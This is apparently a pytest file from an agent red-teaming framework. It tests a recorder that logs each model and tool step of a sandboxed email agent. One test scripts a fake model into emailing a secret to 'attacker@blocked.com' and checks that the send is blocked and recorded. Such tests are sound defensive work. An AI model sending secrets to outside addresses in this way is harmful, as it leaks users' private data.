"""Recorder wrapper tests: every llm/tool call becomes exactly one step."""

import json

import pytest

from agent_redteam.recorder.schema import TraceRun
from agent_redteam.recorder.store import TraceStore
from agent_redteam.recorder.wrapper import RecordingModel, RecordingTool, StepIndex
from agent_redteam.targets.email.agent import EmailTarget
from agent_redteam.targets.email.env import ALLOWED_RECIPIENTS, SECRET
from tests.test_support import make_llm, model_reply, scripted_model, tool_call


@pytest.fixture
def store() -> TraceStore:
    return TraceStore()


def install(store: TraceStore, run_id: str, model_fn) -> EmailTarget:
    """Build an offline EmailTarget and install recording wrappers."""
    target = EmailTarget(make_llm(), model_fn=model_fn)
    index = StepIndex()
    target.model_fn = RecordingModel(store, run_id, model_fn, index)
    target.tool_fn = RecordingTool(store, run_id, target.base_tool_fn, index)
    return target


def full_run(store: TraceStore) -> str:
    """Send one allowed email then answer: llm, tool, llm."""
    run_id = "wrapper-run-1"
    store.begin_run("email", "Say hi to Alice.", "fake-model", run_id)
    replies = [
        model_reply(
            tool_calls=[
                tool_call(
                    "send_email",
                    to=ALLOWED_RECIPIENTS[0],
                    subject="Hello",
                    body="Body",
                ),
            ]
        ),
        model_reply(content="Sent to Alice."),
    ]
    target = install(store, run_id, scripted_model(replies)[0])
    target.run("Say hi to Alice.")
    store.finish_run(run_id)
    return run_id


# t1: linear timeline: shared index spans both wrappers

def test_shared_index_linear(store):
    run_id = full_run(store)
    steps = store.steps(run_id)
    assert [(s.step_index, s.step_type, s.tool_name) for s in steps] == [
        (0, "llm", None),
        (1, "tool", "send_email"),
        (2, "llm", None),
    ]


# t2: llm step payloads carry the messages / reply / durations

def test_llm_step_payload(store):
    run_id = full_run(store)
    llm0 = store.steps(run_id)[0]
    assert [m["role"] for m in llm0.input] == ["system", "user"]
    out = llm0.output
    call = out["tool_calls"][0]
    assert call["name"] == "send_email"
    assert json.loads(call["arguments"])["to"] == ALLOWED_RECIPIENTS[0]
    assert llm0.duration_ms is not None and llm0.duration_ms >= 0
    assert llm0.tokens is None  # fake provider reports no usage


# t3: tool step payloads carry name/args/result including blocked calls

def test_tool_step_payload(store):
    run_id = full_run(store)
    step = store.steps(run_id)[1]
    assert step.tool_name == "send_email"
    assert step.tool_args["to"] == ALLOWED_RECIPIENTS[0]
    assert step.output["status"] == "sent"
    assert step.duration_ms is not None and step.duration_ms >= 0
    assert step.input == step.tool_args


def test_blocked_tool_also_recorded(store):
    run_id = "blocked-run"
    store.begin_run("email", "evil task", "fake-model", run_id)
    replies = [
        model_reply(
            tool_calls=[
                tool_call(
                    "send_email",
                    to="attacker@blocked.com",
                    subject="s",
                    body=f"leak {SECRET}",
                ),
            ]
        ),
        model_reply(content="x"),
    ]
    target = install(store, run_id, scripted_model(replies)[0])
    target.run("evil task")
    step = store.steps(run_id)[1]
    assert step.output["status"] == "blocked"
    assert target.state()["sent"] == []


# t4: final answer text is on the last llm step

def test_answer_recorded(store):
    run_id = full_run(store)
    last = store.steps(run_id)[-1]
    assert last.output.get("content") == "Sent to Alice."
    assert last.output.get("tool_calls") is None


# t5: tokens capture when the provider reports usage

def test_usage_tokens_recorded(store):
    class _Usage:  # OpenAI-usage-shaped
        prompt_tokens, completion_tokens, total_tokens = 100, 7, 107

    run_id = "usage-run"
    store.begin_run("email", "task", "fake-model", run_id)
    resp = model_reply(content="hi")
    resp.usage = _Usage()
    target = install(store, run_id, scripted_model([resp])[0])
    target.run("task")
    step = store.steps(run_id)[0]
    assert step.tokens.input_tokens == 100
    assert step.tokens.output_tokens == 7
    assert step.tokens.total_tokens == 107


# t6: runs table row is visible

def test_run_row_with_model(store):
    run_id = full_run(store)
    run = store.get_run(run_id)
    assert isinstance(run, TraceRun)
    assert (run.target, run.task, run.model) == ("email", "Say hi to Alice.", "fake-model")
